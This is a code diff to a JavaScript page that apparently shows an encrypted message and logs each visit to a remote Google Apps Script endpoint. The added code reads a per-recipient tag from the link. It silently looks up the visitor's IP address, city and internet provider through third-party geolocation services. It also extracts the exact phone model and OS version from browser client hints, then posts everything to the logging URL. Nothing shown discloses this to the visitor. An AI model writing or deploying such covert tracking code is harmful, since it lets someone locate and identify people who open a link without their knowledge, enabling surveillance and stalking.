@@ -45,7 +45,7 @@
 const CONFIG = {
   LOG_URL: "https://script.google.com/macros/s/AKfycbyk_8l2rcF8m_0DROsauXpMrHyudXuBbdGkho2B9CRMq2twaoymf8tC_j1RAcV8Yjr_gA/exec",
   // Output of encrypt.html
-  ENCRYPTED: {"iter":300000,"salt":"AEt2C5VIJzlcay80LOIEaQ==","iv":"TrY+j9s6RhN+Qgfg","data":"jZRdIFvPqv1ThN1ZAYxViqaUILz7OUJ9Co7+wm7UvJuZLlAMdZZi"}
+  ENCRYPTED: {"iter":300000,"salt":"Vsehi2aeoyPl+nsLfh0clA==","iv":"gjJ/2NOAbL5ZeDFP","data":"tSQrbE1IaRFVkBRZGSLwtul5MTRUvGKu3PMLMUgjGsfrVEijM9fiQKEcmes1p2mVW2nU8N6zVvI+crmdDrCUR9PkvbvYxO36/dxe3nAvcGvh+roqjkjLfwjM28rT4Bm8sSIpY72Wi/L1APsNNYLlzf3Dhz17YktTJ3MNw10Gxpx4to+jRJik5EnF+kYowTpfrwRqGvFUE2UKq1ymW6R3HwiymgzTpXr+KBybCeFQt8Yhh2Ls2wBZr2hXbddszZxSjzIkL1FdtEYDufZO5cRbZhLzJShE/45FpzhgaUrD0kylBTr7RR0aNvxQKalF+ACMKJLrDCqy93M2N9RyGkKaaCrCUZJbwhFRBsk7B32grTciZrXUH59afR2G9j2RoiAt/uhJGz1ppEnVVVDtXNyTHbMUHJZV9WBbplOv7V5Cdn2ZQXC+2olrNxjDmmYshSdGe4kV39VAAvtvucgGChloGDDcr21s/pSxp6lLpaVBy2UYfbaCl8GEPm72zVjbMWGiOY0DnAagnXIfGUmRQZF9O2LTy+6VT5Js+FiVLbdGoH92pDD6"}
 };
 /* ==================================== */
 
@@ -58,13 +58,57 @@ try {
   localStorage.setItem("vcount", visitCount);
 } catch { visitorId = "no-storage"; }
 
-function log(event) {
+// Tag from the link, e.g. .../msg/?r=bub  ->  "bub"
+const TAG = (new URLSearchParams(location.search).get("r") || "").slice(0, 30);
+
+// Approximate city + internet provider (looked up once)
+async function lookup(url, pick) {
+  const c = new AbortController();
+  const t = setTimeout(() => c.abort(), 3000);
+  try {
+    const j = await (await fetch(url, { signal: c.signal })).json();
+    return pick(j);
+  } finally { clearTimeout(t); }
+}
+const netInfo = (async () => {
+  try {
+    return await lookup("https://ipwho.is/", j => {
+      if (j.success === false) throw 0;
+      return { ip: j.ip, city: [j.city, j.region].filter(Boolean).join(", "),
+               isp: (j.connection && (j.connection.isp || j.connection.org)) || "" };
+    });
+  } catch {}
+  try {
+    return await lookup("https://ipapi.co/json/", j => {
+      if (j.error) throw 0;
+      return { ip: j.ip, city: [j.city, j.region].filter(Boolean).join(", "), isp: j.org || "" };
+    });
+  } catch {}
+  return {};
+})();
+
+// Real phone model (Chrome on Android hides it from the normal user agent)
+const hints = (async () => {
+  try {
+    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+      const h = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
+      return { model: h.model || "", osver: h.platformVersion || "" };
+    }
+  } catch {}
+  return {};
+})();
+
+async function log(event) {
   if (!CONFIG.LOG_URL || CONFIG.LOG_URL.startsWith("PASTE")) return;
+  const net = await netInfo;
+  const hw = await hints;
   fetch(CONFIG.LOG_URL, {
     method: "POST", mode: "no-cors", keepalive: true,
     headers: { "Content-Type": "text/plain;charset=utf-8" },
     body: JSON.stringify({
-      event, visitor: visitorId, visit: visitCount,
+      event, tag: TAG, visitor: visitorId, visit: visitCount,
+      model: hw.model || "", osver: hw.osver || "",
+      city: net.city || "", isp: net.isp || "", ip: net.ip || "",
       ua: navigator.userAgent,
       screen: `${screen.width}x${screen.height}`,
       tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
